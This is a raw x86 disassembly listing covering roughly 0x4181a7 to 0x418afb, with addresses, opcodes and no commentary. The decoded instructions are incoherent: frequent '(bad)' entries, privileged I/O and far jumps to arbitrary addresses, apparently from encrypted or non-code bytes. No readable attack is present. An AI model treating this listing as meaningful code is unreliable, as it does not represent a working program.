  4181a7:	sub    BYTE PTR [esi-0x23],dh
  4181aa:	jbe    0x41822a
  4181ac:	pop    ss
  4181ad:	(bad)  
  4181ae:	scas   eax,DWORD PTR es:[edi]
  4181af:	xor    cl,BYTE PTR [ecx+0x7aecfca8]
  4181b5:	aaa    
  4181b6:	xlat   BYTE PTR ds:[ebx]
  4181b7:	imul   esi,DWORD PTR [ecx+0x43],0x31
  4181bb:	fwait
  4181bc:	push   esp
  4181bd:	inc    edx
  4181be:	push   cs
  4181bf:	mov    al,ds:0xa42adbf6
  4181c4:	add    al,0xb9
  4181c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c7:	add    al,0xc8
  4181c9:	xor    DWORD PTR [edx+0x72651088],ebx
  4181cf:	pop    esi
  4181d0:	lods   al,BYTE PTR ds:[esi]
  4181d1:	adc    ah,BYTE PTR [ecx-0x41]
  4181d4:	int    0x3a
  4181d6:	cmp    al,BYTE PTR [ebx]
  4181d8:	ja     0x4181cb
  4181da:	cmp    eax,0x5cae8a9b
  4181df:	fadd   QWORD PTR [edx+eax*2+0x110b7203]
  4181e6:	out    dx,eax
  4181e7:	loopne 0x418215
  4181e9:	jne    0x4181dc
  4181eb:	dec    ecx
  4181ec:	loop   0x4181cb
  4181ee:	adc    al,0xc3
  4181f0:	mov    eax,0x4765f719
  4181f5:	or     esi,esp
  4181f7:	sbb    BYTE PTR [ebp+0x0],ch
  4181fa:	sti    
  4181fb:	test   edi,0x8d5c4c4
  418201:	dec    esi
  418202:	pop    edx
  418203:	test   DWORD PTR [edx],edx
  418205:	inc    esp
  418206:	loopne 0x418260
  418208:	cmp    al,0x7a
  41820a:	js     0x41819c
  41820c:	es xchg edi,eax
  41820e:	in     al,0xee
  418210:	inc    ebx
  418211:	cmp    esp,DWORD PTR [eax-0x7c6c1c98]
  418217:	jnp    0x418297
  418219:	lahf   
  41821a:	push   0xd4e1ea7d
  41821f:	mov    cl,0x6f
  418221:	loopne 0x418223
  418223:	jnp    0x4181f0
  418225:	stos   BYTE PTR es:[edi],al
  418226:	nop
  418227:	int    0x5
  418229:	sub    edi,edi
  41822b:	pushf  
  41822c:	jmp    0xb77f:0x5462737a
  418233:	or     bh,BYTE PTR [edx+ebx*1-0x28]
  418237:	mov    edi,0xe02097c9
  41823c:	mov    eax,0xbfaf4223
  418241:	jo     0x418277
  418243:	in     eax,dx
  418244:	inc    eax
  418245:	and    eax,0x54e80c8e
  41824a:	xchg   esp,eax
  41824b:	xchg   esp,eax
  41824c:	inc    esp
  41824d:	jno    0x4181f1
  41824f:	mov    esp,0x6f03c62a
  418254:	in     eax,dx
  418255:	test   eax,0x150c4214
  41825a:	sbb    BYTE PTR [di+0x1b],bl
  41825e:	stos   BYTE PTR es:[edi],al
  41825f:	adc    eax,0x57ae0346
  418264:	ja     0x418289
  418266:	hlt    
  418267:	xchg   ebp,eax
  418268:	out    dx,eax
  418269:	add    al,0x97
  41826b:	aam    0xd9
  41826d:	lock push ds
  41826f:	mov    ebp,0x3e19236e
  418274:	daa    
  418275:	scas   eax,DWORD PTR es:[edi]
  418276:	inc    esp
  418277:	mov    ?,WORD PTR [edx-0x69d44ab1]
  41827d:	sbb    DWORD PTR [esi],0xd05507e9
  418283:	dec    edx
  418284:	jg     0x41822b
  418286:	xor    cl,dh
  418288:	mov    DWORD PTR [esi],edi
  41828a:	add    eax,0x306ca593
  41828f:	mov    eax,ds:0x587bd238
  418294:	dec    ebp
  418295:	mov    esp,0x6be6aca5
  41829a:	xchg   edi,eax
  41829b:	fwait
  41829c:	adc    BYTE PTR [esi-0x7b],ch
  41829f:	sub    BYTE PTR [edx-0x5425704f],bh
  4182a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a6:	adc    DWORD PTR [ebx-0x3d],edx
  4182a9:	and    al,al
  4182ab:	xor    dl,BYTE PTR [ebp-0xc3f8577]
  4182b1:	and    BYTE PTR [edi],al
  4182b3:	ja     0x41829d
  4182b5:	fsubr  DWORD PTR [ebp-0x29]
  4182b8:	jo     0x41824b
  4182ba:	xchg   ecx,eax
  4182bb:	outs   dx,BYTE PTR ds:[esi]
  4182bc:	out    0xc9,al
  4182be:	sbb    esi,DWORD PTR [edx-0x29]
  4182c1:	jns    0x41828e
  4182c3:	sbb    dh,BYTE PTR [ebx]
  4182c5:	xor    DWORD PTR [edx+0x47],edi
  4182c8:	jo     0x4182bb
  4182ca:	mov    dl,0x1e
  4182cc:	jge    0x4182b8
  4182ce:	adc    eax,0x9f4d2eef
  4182d3:	dec    edx
  4182d4:	dec    edx
  4182d5:	add    ebx,edi
  4182d7:	xor    BYTE PTR ds:0x309270e,dl
  4182dd:	lds    ebx,FWORD PTR [eax+0x10]
  4182e0:	mov    esp,DWORD PTR [edi-0x50]
  4182e3:	test   DWORD PTR [esi+0x47a38d92],ebx
  4182e9:	jmp    0x63b8:0x61b3e961
  4182f0:	ret    
  4182f1:	or     eax,0x24de4678
  4182f6:	cli    
  4182f7:	stc    
  4182f8:	out    dx,al
  4182f9:	dec    ebp
  4182fa:	scas   al,BYTE PTR es:[edi]
  4182fb:	out    0xbc,eax
  4182fd:	mov    cl,BYTE PTR [esi+ebp*1-0x4c3a86e]
  418304:	push   0xffffff97
  418306:	mov    WORD PTR [edi-0x4a],ds
  418309:	(bad)  
  41830b:	lock mov al,0x9f
  41830e:	bswap  ebp
  418310:	push   es
  418311:	sub    DWORD PTR ds:0xd0acb343,ebp
  418317:	sar    DWORD PTR [edx*2-0x2ce17876],cl
  41831e:	sbb    cl,bl
  418320:	sub    eax,0xb86915aa
  418325:	test   DWORD PTR [ecx-0x35fb2be9],edx
  41832b:	pop    ebp
  41832c:	jge    0x4182cc
  41832e:	adc    al,0xcd
  418330:	push   ecx
  418331:	cwde   
  418332:	pushf  
  418333:	mov    edi,0x6ff7296a
  418338:	dec    esp
  418339:	sbb    eax,0x820153df
  41833e:	push   eax
  41833f:	xchg   ebx,eax
  418340:	(bad)  
  418341:	mov    bh,0x13
  418343:	call   0xe2955655
  418348:	or     al,0x56
  41834a:	ret    
  41834b:	sub    DWORD PTR ds:0x773d183a,0xcec04b6e
  418355:	(bad)  
  418356:	loopne 0x418365
  418358:	mov    edx,0x23ed9ecb
  41835d:	adc    DWORD PTR [edi-0x6c4dc15],0xffffffaf
  418364:	xchg   esp,eax
  418365:	pop    edx
  418366:	push   eax
  418367:	and    eax,0xb823922
  41836c:	dec    edx
  41836d:	retf   
  41836e:	fld    QWORD PTR [edi]
  418370:	xor    al,0x7
  418372:	jne    0x4183b0
  418374:	and    ah,ch
  418376:	ins    WORD PTR es:[edi],dx
  418378:	add    DWORD PTR [edi-0x2b],edi
  41837b:	mul    DWORD PTR [ecx]
  41837d:	xchg   esp,eax
  41837e:	shl    BYTE PTR [ebx+esi*4-0x35],1
  418382:	cmp    bh,BYTE PTR [esi+ecx*1]
  418385:	call   0x31aabbeb
  41838a:	test   al,0xc3
  41838c:	inc    ebx
  41838d:	fwait
  41838e:	sub    ebp,DWORD PTR [edi+0x68f36fa1]
  418394:	dec    eax
  418395:	test   DWORD PTR [ebx-0x713078ea],edx
  41839b:	daa    
  41839c:	push   ds
  41839d:	mov    ch,0x3d
  41839f:	adc    eax,0x1425fdb4
  4183a4:	inc    esp
  4183a5:	and    eax,0x8a13c230
  4183aa:	int    0x99
  4183ac:	and    eax,0x86460509
  4183b1:	jecxz  0x418401
  4183b3:	xor    BYTE PTR [eax+0x76],bl
  4183b6:	sbb    esp,DWORD PTR [ebp+0x600f1676]
  4183bc:	adc    eax,0xbda6bf50
  4183c1:	mov    dl,0x8e
  4183c3:	adc    dh,BYTE PTR ss:[edi-0x5e64dbf6]
  4183ca:	cdq    
  4183cb:	cmp    esp,ebx
  4183cd:	shl    BYTE PTR [esi],1
  4183cf:	push   edi
  4183d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183d1:	fwait
  4183d2:	aas    
  4183d3:	pop    esi
  4183d4:	cmc    
  4183d5:	adc    BYTE PTR [esi],0x78
  4183d8:	cld    
  4183d9:	mov    dl,0x9e
  4183db:	cli    
  4183dc:	lea    ebp,[edi-0x16ae4afe]
  4183e2:	ja     0x4183cb
  4183e4:	outs   dx,DWORD PTR ds:[esi]
  4183e5:	je     0x418392
  4183e7:	mov    dh,0x70
  4183e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183ea:	(bad)  
  4183ec:	in     eax,0x72
  4183ee:	jecxz  0x41845f
  4183f0:	jge    0x418454
  4183f2:	in     al,dx
  4183f3:	adc    dl,al
  4183f5:	popf   
  4183f6:	test   DWORD PTR [ebx],ecx
  4183f8:	ins    DWORD PTR es:[edi],dx
  4183f9:	inc    eax
  4183fa:	bound  ecx,QWORD PTR [esp+ecx*2]
  4183fd:	sub    BYTE PTR [eax-0x43c5597b],bh
  418403:	and    BYTE PTR [edi+ebp*4],cl
  418406:	sub    al,0x67
  418408:	inc    edx
  418409:	jle    0x418415
  41840b:	dec    esi
  41840c:	mov    bh,0xf9
  41840e:	mov    ebp,0x960a3ec7
  418413:	jae    0x4183e6
  418415:	in     al,dx
  418416:	leave  
  418417:	dec    esi
  418418:	jmp    0xfd86:0x33121de5
  41841f:	test   DWORD PTR [ebp-0x6d],edx
  418422:	fst    QWORD PTR [ecx]
  418424:	ins    DWORD PTR es:[edi],dx
  418425:	or     eax,0x5d4f42bf
  41842a:	cld    
  41842b:	mov    WORD PTR [edx+edx*1+0xd679377],ds
  418432:	or     al,0x92
  418434:	call   0x7c110cf7
  418439:	xchg   BYTE PTR [edi],cl
  41843b:	pop    ebp
  41843c:	sar    DWORD PTR [ecx-0x66],0xef
  418440:	fld    QWORD PTR [edi]
  418442:	xchg   ebp,eax
  418443:	jge    0x4183c8
  418445:	int3   
  418446:	retf   0x2c7d
  418449:	adc    esp,DWORD PTR [edx-0x52]
  41844c:	mov    bh,0xde
  41844e:	repz jo 0x4184a4
  418451:	enter  0x1865,0xdc
  418455:	add    DWORD PTR [esi-0x4823539a],edi
  41845b:	shl    DWORD PTR [ebp-0x16c2ed29],1
  418461:	xor    dl,bl
  418463:	sub    DWORD PTR [esi-0x5dcb7ba4],0x75
  41846a:	xor    eax,0xb1025ce0
  41846f:	mov    edx,0xc6fd68a5
  418474:	xor    BYTE PTR [eax-0x54],bh
  418477:	push   ebx
  418478:	mov    ebx,0xdb70c2c2
  41847d:	sub    eax,0x75a12c7d
  418482:	mov    edx,0xbcd61ddf
  418487:	arpl   WORD PTR [ecx+esi*4],bx
  41848a:	push   eax
  41848b:	and    eax,0x700db9ef
  418490:	and    eax,ebp
  418492:	add    ebx,edx
  418494:	mov    ds:0xab11b835,eax
  418499:	ror    DWORD PTR [edi],1
  41849b:	in     al,dx
  41849c:	adc    BYTE PTR [eax-0x2b],bh
  41849f:	in     al,dx
  4184a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a1:	outs   dx,BYTE PTR ds:[esi]
  4184a2:	and    eax,0xdb4c36c1
  4184a7:	loopne 0x4184f2
  4184a9:	mov    ebp,0x82a4cf31
  4184ae:	mov    esp,0x1a35cffc
  4184b3:	std    
  4184b4:	imul   eax,DWORD PTR [ebx-0x2e],0xffffffa2
  4184b8:	leave  
  4184b9:	mov    cl,0xae
  4184bb:	jecxz  0x4184a0
  4184bd:	sub    edi,ecx
  4184bf:	arpl   WORD PTR [ebx],sp
  4184c1:	pop    ds
  4184c2:	and    al,0xee
  4184c4:	sbb    ecx,DWORD PTR [ecx]
  4184c6:	iret   
  4184c7:	lods   al,BYTE PTR ds:[esi]
  4184c8:	inc    ebp
  4184c9:	js     0x4184ed
  4184cb:	mov    dl,0x2a
  4184cd:	scas   eax,DWORD PTR es:[edi]
  4184ce:	ror    ah,0x32
  4184d1:	sub    DWORD PTR [edi+ebp*4],esi
  4184d4:	dec    ebp
  4184d5:	pop    ebx
  4184d6:	in     al,0x28
  4184d8:	sub    al,BYTE PTR [esi]
  4184da:	jecxz  0x41848b
  4184dc:	cwde   
  4184dd:	pop    edx
  4184de:	xchg   ebx,eax
  4184df:	(bad)  
  4184e0:	pop    eax
  4184e1:	jmp    0x8add:0x264ef064
  4184e8:	lock dec esi
  4184ea:	sbb    BYTE PTR [ebp+eax*1-0x5],0x3a
  4184ef:	pop    eax
  4184f0:	pop    ss
  4184f1:	xor    DWORD PTR [edx-0x2f],ebp
  4184f4:	out    dx,al
  4184f5:	add    al,0x8f
  4184f7:	rcr    DWORD PTR [esi+eiz*8-0x13e0852e],cl
  4184fe:	xchg   esp,eax
  4184ff:	ficomp WORD PTR [esi+eiz*1]
  418502:	repz imul BYTE PTR [eax+0x1bf3dfaf]
  418509:	test   DWORD PTR [edi-0x21],esi
  41850c:	cs push esp
  41850e:	mov    ebx,DWORD PTR [edx]
  418510:	bound  esp,QWORD PTR [ebx-0x7b]
  418513:	sbb    eax,0x34d9dca8
  418518:	adc    DWORD PTR [eax],ebx
  41851a:	adc    bl,BYTE PTR [ebx]
  41851c:	mov    ds:0x3a1608ec,eax
  418521:	adc    DWORD PTR [ecx-0x60],esi
  418524:	loop   0x4184fa
  418526:	jmp    0x418540
  418528:	jge    0x41858e
  41852a:	inc    esi
  41852b:	arpl   WORD PTR [eax+0x7c],bx
  41852e:	pop    eax
  41852f:	cmp    ecx,DWORD PTR [eax]
  418531:	not    DWORD PTR [eax]
  418533:	xchg   ecx,eax
  418534:	sbb    al,0xe
  418536:	loopne 0x4184e3
  418538:	pop    ebp
  418539:	ins    BYTE PTR es:[edi],dx
  41853a:	sbb    DWORD PTR [edx+eax*1+0x7897e73a],edx
  418541:	int    0xb3
  418543:	push   ss
  418544:	push   ecx
  418545:	fcom   QWORD PTR [edx+0x12]
  418548:	data16 mul bl
  41854b:	xchg   esi,eax
  41854c:	(bad)
  41854f:	inc    esi
  418550:	and    ch,ch
  418552:	adc    ch,dh
  418554:	out    0xb,eax
  418556:	stc    
  418557:	mov    eax,ds:0x42934fb5
  41855c:	inc    ecx
  41855d:	and    eax,0xd907604b
  418562:	leave  
  418563:	jge    0x41854e
  418565:	jne    0x41851d
  418567:	scas   eax,DWORD PTR es:[edi]
  418568:	into   
  418569:	cmp    ebp,DWORD PTR [ecx+0x377e1b05]
  41856f:	jno    0x418583
  418571:	jo     0x418541
  418573:	cmp    esi,DWORD PTR [esi+0x35]
  418576:	sub    BYTE PTR [ebx],0x5b
  418579:	int3   
  41857a:	or     dl,cl
  41857c:	stos   DWORD PTR es:[edi],eax
  41857d:	adc    al,0x60
  41857f:	cmp    al,0x68
  418581:	cmp    bh,0x33
  418584:	push   cs
  418585:	jle    0x4185b0
  418587:	adc    dl,BYTE PTR [edi]
  418589:	xor    ebx,ebp
  41858b:	enter  0xa7ff,0x5c
  41858f:	dec    edi
  418590:	sub    eax,0x817b3e3
  418595:	jbe    0x4185a2
  418597:	push   cs
  418598:	or     BYTE PTR [ebp-0x4c],ch
  41859b:	xchg   ebx,eax
  41859c:	daa    
  41859d:	mov    ds:0x8279f1ac,eax
  4185a2:	leave  
  4185a3:	jb     0x418623
  4185a5:	jle    0x418564
  4185a7:	(bad)  
  4185a8:	shl    DWORD PTR [edi+0x41d8c157],cl
  4185ae:	out    dx,eax
  4185af:	mov    eax,ds:0x1a56b4e3
  4185b4:	pop    ss
  4185b5:	cmp    esp,DWORD PTR [esi+0x27e3cee6]
  4185bb:	push   ebx
  4185bc:	mov    ebx,0x2f9d32f9
  4185c1:	das    
  4185c2:	and    edi,DWORD PTR [esp+ebp*8+0x27fb8b04]
  4185c9:	cli    
  4185ca:	fwait
  4185cb:	jle    0x418630
  4185cd:	xchg   ebp,eax
  4185ce:	ror    BYTE PTR [edi-0x6d057ce4],0xcb
  4185d5:	xchg   edx,eax
  4185d6:	jns    0x41861a
  4185d8:	in     eax,0xec
  4185da:	ins    BYTE PTR es:[edi],dx
  4185db:	loopne 0x4185e8
  4185dd:	pop    eax
  4185de:	jge    0x418586
  4185e0:	rol    BYTE PTR [edi+ecx*8-0x7e],cl
  4185e4:	mov    bl,0xd7
  4185e6:	push   ebp
  4185e7:	rcr    DWORD PTR [esp+ecx*8+0x19],0x4d
  4185ec:	repnz sbb bl,bh
  4185ef:	rcr    BYTE PTR [esi],1
  4185f1:	adc    al,0x47
  4185f3:	scas   al,BYTE PTR es:[edi]
  4185f4:	jne    0x4185d7
  4185f6:	xchg   ebx,eax
  4185f7:	xor    BYTE PTR [ebx-0x2f],ah
  4185fa:	(bad)  
  4185fb:	cld    
  4185fc:	dec    eax
  4185fd:	fstp   DWORD PTR [ecx+0x6ddcb76e]
  418603:	pop    ebx
  418604:	sbb    eax,0xb20bbc44
  418609:	sub    BYTE PTR [ecx+0x6d],dh
  41860c:	jbe    0x41867d
  41860e:	fdivr  QWORD PTR [edx+eax*1]
  418611:	mov    dh,0xae
  418613:	push   ss
  418614:	cmp    BYTE PTR [ebx-0x4f],bh
  418617:	les    esp,FWORD PTR [esi]
  418619:	jg     0x4185ac
  41861b:	sbb    BYTE PTR [eax-0x3c],dl
  41861e:	je     0x41864b
  418620:	sysret 
  418622:	dec    esp
  418623:	stos   BYTE PTR es:[edi],al
  418624:	scas   al,BYTE PTR es:[edi]
  418625:	loope  0x4185a8
  418627:	repz pop es
  418629:	popf   
  41862a:	jp     0x4185d6
  41862c:	icebp  
  41862d:	and    DWORD PTR [esp+ebx*4],eax
  418630:	xor    BYTE PTR [edx-0xf],bl
  418633:	xchg   esi,ecx
  418635:	cmp    cl,BYTE PTR [edi]
  418637:	or     BYTE PTR [esi-0x1afd104],bl
  41863d:	adc    DWORD PTR [ebp-0x1a],ecx
  418640:	sbb    bl,bl
  418642:	mov    ebp,0x8b07492d
  418647:	mov    cl,0xcc
  418649:	pop    eax
  41864a:	lods   al,BYTE PTR ds:[esi]
  41864b:	repz mov ebx,ecx
  41864e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41864f:	add    al,0x77
  418651:	mov    esi,0x8f22a1f5
  418656:	lea    esp,[ebx+ecx*4-0xc3c7f9e]
  41865d:	out    dx,eax
  41865e:	dec    eax
  41865f:	fcomp  st(6)
  418661:	ins    DWORD PTR es:[edi],dx
  418662:	jno    0x418691
  418664:	fmul   st(0),st
  418666:	ja     0x418601
  418668:	mov    bl,0x70
  41866a:	imul   ebx,ebx,0xffffffed
  41866d:	clc    
  41866e:	je     0x418661
  418670:	popa   
  418671:	fsub   QWORD PTR [eax]
  418673:	rcr    DWORD PTR [eax],1
  418675:	not    DWORD PTR [edi+0x35]
  418678:	sub    edx,eax
  41867a:	ret    
  41867b:	pop    ds
  41867c:	paddb  mm3,QWORD PTR [esi]
  41867f:	or     al,0x0
  418681:	leave  
  418682:	in     al,dx
  418683:	leave  
  418684:	and    DWORD PTR [ecx+0x9df44c6],0x395f5546
  41868e:	test   eax,0xebaf92b5
  418693:	cwde   
  418694:	icebp  
  418695:	mov    edi,0x9d43db21
  41869a:	mov    esi,0xf5c7dcd3
  41869f:	xlat   BYTE PTR ds:[ebx]
  4186a0:	fwait
  4186a1:	adc    BYTE PTR [eax],al
  4186a3:	arpl   WORD PTR [ecx],ax
  4186a5:	retf   
  4186a6:	push   edx
  4186a7:	rcl    DWORD PTR [esi-0x55031ec1],1
  4186ad:	cli    
  4186ae:	inc    ebx
  4186af:	retf   
  4186b0:	pop    ds
  4186b1:	ins    DWORD PTR es:[edi],dx
  4186b2:	inc    edi
  4186b3:	mov    edx,0xd660e563
  4186b8:	push   edx
  4186b9:	outs   dx,DWORD PTR ds:[esi]
  4186ba:	push   ss
  4186bb:	dec    ebp
  4186bc:	pop    esi
  4186bd:	or     BYTE PTR [edx+edi*8+0x22],0xc4
  4186c2:	push   edx
  4186c3:	fcomp  QWORD PTR [edx]
  4186c5:	ds js  0x418714
  4186c8:	sub    al,0xe0
  4186ca:	pop    ss
  4186cb:	push   cs
  4186cc:	mov    esi,0x264bfc38
  4186d1:	(bad)  
  4186d2:	idiv   al
  4186d4:	stos   BYTE PTR es:[edi],al
  4186d5:	dec    edi
  4186d6:	daa    
  4186d7:	into   
  4186d8:	cli    
  4186d9:	jg     0x4186e4
  4186db:	pop    ds
  4186dc:	jp     0x4186d0
  4186de:	dec    edx
  4186df:	xchg   esp,eax
  4186e0:	pop    eax
  4186e1:	jmp    0x8c55bde
  4186e6:	ja     0x4186d4
  4186e8:	call   0x261a7487
  4186ed:	sub    al,0x87
  4186f0:	sbb    ah,dh
  4186f2:	push   eax
  4186f3:	in     eax,dx
  4186f4:	test   DWORD PTR [esi],0xcbd30586
  4186fa:	mov    ah,0x2c
  4186fd:	ret    0xf08d
  418700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  4188d5:	pop    esi
  4188d6:	mov    DWORD PTR ds:0x7feed766,eax
  4188dc:	mov    ecx,0x4f6277d8
  4188e1:	xor    edi,DWORD PTR [edx+0x4c3b7741]
  4188e7:	add    DWORD PTR [eax],eax
  4188e9:	and    BYTE PTR [edi],al
  4188eb:	add    BYTE PTR [eax],al
  4188ed:	fadd   DWORD PTR [ebx-0x1d]
  4188f0:	pop    eax
  4188f1:	inc    edi
  4188f2:	cdq    
  4188f3:	scas   al,BYTE PTR es:[edi]
  4188f4:	mov    dh,0xaa
  4188f6:	lods   al,BYTE PTR ds:[esi]
  4188f7:	jbe    0x41892d
  4188f9:	cmp    ch,BYTE PTR [eax]
  4188fb:	add    eax,DWORD PTR [esi-0x72]
  4188fe:	rcl    edi,0xd8
  418901:	sbb    al,0xe4
  418903:	or     dh,dl
  418905:	retf   
  418906:	popa   
  418907:	jbe    0x41889e
  418909:	ret    
  41890a:	xchg   ebp,eax
  41890b:	cmp    al,0xb7
  41890d:	jge    0x41890f
  41890f:	cmp    eax,0x9b43537d
  418914:	js     0x41889e
  418916:	mov    edi,0xc125945b
  41891b:	ins    BYTE PTR es:[edi],dx
  41891c:	xchg   ebp,edx
  41891e:	(bad)  
  418920:	jg     0x4188f6
  418922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418923:	mov    ds:0x9a9e9745,al
  418928:	hlt    
  418929:	pop    es
  41892a:	and    al,0x5f
  41892c:	push   edi
  41892d:	gs push 0x4948194e
  418933:	ror    dl,1
  418935:	stc    
  418936:	retf   
  418937:	dec    edi
  418938:	jne    0x418996
  41893a:	ins    BYTE PTR es:[edi],dx
  41893b:	stc    
  41893c:	icebp  
  41893d:	das    
  41893e:	int    0xc9
  418940:	test   al,0x98
  418942:	cmp    al,0xca
  418944:	inc    ecx
  418945:	aas    
  418946:	test   DWORD PTR [edx-0x44d90b46],ebp
  41894c:	push   es
  41894d:	loopne 0x4188e7
  41894f:	imul   ebp,DWORD PTR [edi],0x5c855869
  418955:	mov    ds:0x469a44f0,eax
  41895a:	outs   dx,DWORD PTR ds:[esi]
  41895b:	outs   dx,DWORD PTR ds:[esi]
  41895c:	loop   0x41899b
  41895e:	jbe    0x4188e9
  418960:	loopne 0x4189c5
  418962:	xchg   edi,eax
  418963:	ja     0x41891e
  418965:	addr16 cmc 
  418967:	sub    DWORD PTR [ebp-0x6d],eax
  41896a:	lock mov ebx,0x20289fce
  418970:	mov    ch,0x57
  418972:	iret   
  418973:	mov    cl,0x9
  418975:	sbb    bl,BYTE PTR [edi+0x523693aa]
  41897b:	inc    esp
  41897c:	xchg   edx,eax
  41897d:	jmp    0x418925
  41897f:	jmp    0x41890b
  418981:	sub    BYTE PTR [eax-0x44],dl
  418984:	sar    BYTE PTR [ebx-0x5e],cl
  418987:	ror    BYTE PTR [esi],cl
  418989:	dec    edx
  41898a:	sbb    bh,BYTE PTR [ecx+eiz*1-0x2df1c40f]
  418991:	sbb    DWORD PTR [eax-0xf],ebp
  418994:	push   edx
  418995:	pop    eax
  418996:	popf   
  418997:	je     0x4189f9
  418999:	aam    0x8d
  41899b:	cmp    esi,DWORD PTR [edx+0x536eed93]
  4189a1:	add    esp,esi
  4189a3:	inc    edx
  4189a4:	cmc    
  4189a5:	cdq    
  4189a6:	in     al,dx
  4189a7:	xchg   ecx,eax
  4189a8:	std    
  4189a9:	dec    edx
  4189aa:	les    eax,FWORD PTR [edi-0x5d1e3066]
  4189b0:	add    esi,DWORD PTR [eax]
  4189b2:	mov    BYTE PTR [ecx],bl
  4189b4:	ret    
  4189b5:	adc    dh,BYTE PTR [edi-0x48]
  4189b8:	scas   eax,DWORD PTR es:[edi]
  4189b9:	(bad)  
  4189ba:	sbb    al,0x77
  4189bc:	mov    al,ds:0x92ad08fc
  4189c1:	and    al,0x79
  4189c3:	mov    esi,0x454c7563
  4189c8:	mov    al,0xce
  4189ca:	sbb    al,0x42
  4189cc:	inc    ebx
  4189cd:	and    ah,bl
  4189cf:	icebp  
  4189d0:	add    al,ah
  4189d2:	xchg   esi,eax
  4189d3:	shl    BYTE PTR [ebp+0x14],cl
  4189d6:	hlt    
  4189d7:	push   ebp
  4189d8:	cmp    DWORD PTR [ebp+0x4f],esi
  4189db:	ss es cld 
  4189de:	cmc    
  4189df:	jb     0x4189ed
  4189e1:	ja     0x418984
  4189e3:	rcl    BYTE PTR [esi+0x8],0x10
  4189e7:	jge    0x418969
  4189e9:	xchg   edx,eax
  4189ea:	jle    0x418a1d
  4189ec:	dec    DWORD PTR [esi+eiz*8+0x49]
  4189f0:	je     0x41898b
  4189f2:	jl     0x41899c
  4189f4:	dec    esi
  4189f5:	push   edx
  4189f6:	jns    0x418995
  4189f8:	sbb    cl,ch
  4189fa:	mov    DWORD PTR ds:0x19d8c7c3,edx
  418a00:	(bad)  
  418a01:	pop    ds
  418a02:	hlt    
  418a03:	ds aam 0x8c
  418a06:	pop    ss
  418a07:	jl     0x418a37
  418a09:	xchg   esi,eax
  418a0a:	mov    al,0x7b
  418a0c:	mov    BYTE PTR [esi+0x7f],dh
  418a0f:	pushf  
  418a10:	dec    edi
  418a11:	mov    ds:0x513d5e6,al
  418a16:	call   0xda1fb605
  418a1b:	jne    0x418a95
  418a1d:	push   ecx
  418a1e:	les    eax,FWORD PTR [eax-0x61546ac4]
  418a24:	mov    ah,0xdd
  418a26:	pop    eax
  418a27:	test   al,0xc1
  418a29:	(bad)  
  418a2a:	jle    0x4189df
  418a2c:	mov    esi,0x9606e806
  418a31:	xor    eax,0x4922022e
  418a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a37:	adc    DWORD PTR [ecx-0x177aa576],edi
  418a3d:	(bad)  
  418a3e:	inc    edi
  418a3f:	push   esi
  418a40:	call   0x7ecb1c15
  418a45:	cmp    BYTE PTR [esp+esi*4-0x52],ah
  418a49:	fs adc esp,eax
  418a4c:	push   esp
  418a4d:	jmp    FWORD PTR [ebx]
  418a4f:	jg     0x418a85
  418a51:	xchg   edx,eax
  418a52:	(bad)  
  418a54:	shl    DWORD PTR [ebp+0x7c],0x86
  418a58:	mov    edx,0xf2866c72
  418a5d:	cdq    
  418a5e:	or     dl,al
  418a60:	sbb    ecx,DWORD PTR [eax+0x109855aa]
  418a66:	dec    ebx
  418a67:	lods   eax,DWORD PTR ds:[esi]
  418a68:	inc    edi
  418a69:	inc    eax
  418a6a:	sbb    BYTE PTR [eax+0x75],cl
  418a6d:	les    esi,FWORD PTR [ebp+0x2fbd0ff3]
  418a73:	(bad)  
  418a74:	in     al,dx
  418a75:	jp     0x418a64
  418a77:	jecxz  0x418a67
  418a79:	adc    al,BYTE PTR [ebx]
  418a7b:	jne    0x418ac8
  418a7d:	jmp    FWORD PTR [eax]
  418a7f:	push   0xffffffd0
  418a81:	add    bh,bl
  418a83:	aad    0xc1
  418a85:	mov    ds:0x975fb7af,eax
  418a8a:	(bad)  
  418a8b:	sub    al,0x6f
  418a8d:	jnp    0x418a9c
  418a8f:	test   al,0x26
  418a91:	sbb    esi,DWORD PTR [edi]
  418a93:	(bad)  [edx+0x3]
  418a96:	inc    ebx
  418a97:	repnz (bad) 
  418a99:	clc    
  418a9a:	push   ds
  418a9b:	cld    
  418a9c:	in     eax,0x66
  418a9e:	stos   BYTE PTR es:[edi],al
  418a9f:	in     eax,dx
  418aa0:	ja     0x418b05
  418aa2:	sbb    BYTE PTR [edx],dh
  418aa4:	fcom   QWORD PTR [edi+0x214e6111]
  418aaa:	pushf  
  418aab:	(bad)  
  418aad:	std    
  418aae:	aad    0xf6
  418ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ab1:	or     dl,BYTE PTR [ecx+0x1799fce5]
  418ab7:	sbb    al,0xc5
  418ab9:	jns    0x418a48
  418abb:	stc    
  418abc:	xchg   BYTE PTR [eax-0x60],dh
  418abf:	mov    dh,BYTE PTR [ecx]
  418ac1:	sub    BYTE PTR [esi-0x51],al
  418ac4:	xchg   esp,eax
  418ac5:	pop    esp
  418ac6:	push   ecx
  418ac7:	ror    DWORD PTR [edi-0x51],0x85
  418acb:	pop    ebx
  418acc:	jmp    0x418a90
  418ace:	xchg   esp,eax
  418acf:	or     al,0x44
  418ad1:	xchg   ebx,eax
  418ad2:	jb     0x418ad0
  418ad4:	mov    esi,0xaa702a63
  418ad9:	aaa    
  418ada:	stos   DWORD PTR es:[edi],eax
  418adb:	pop    es
  418adc:	adc    cl,BYTE PTR [ecx+0x57]
  418adf:	xor    BYTE PTR [ebx+0x669e5640],cl
  418ae5:	aad    0xfa
  418ae7:	jmp    0x418b64
  418ae9:	mov    bh,0xb9
  418aeb:	inc    esi
  418aec:	fimul  WORD PTR [ebp-0x6f]
  418aef:	xchg   esi,eax
  418af0:	and    ebx,DWORD PTR [ebx]
  418af2:	mov    edi,0x3874b606
  418af7:	xlat   BYTE PTR gs:[bx]
  418afa:	(bad)  
  418afb:	fcom   DWORD PTR [edx+0x23]
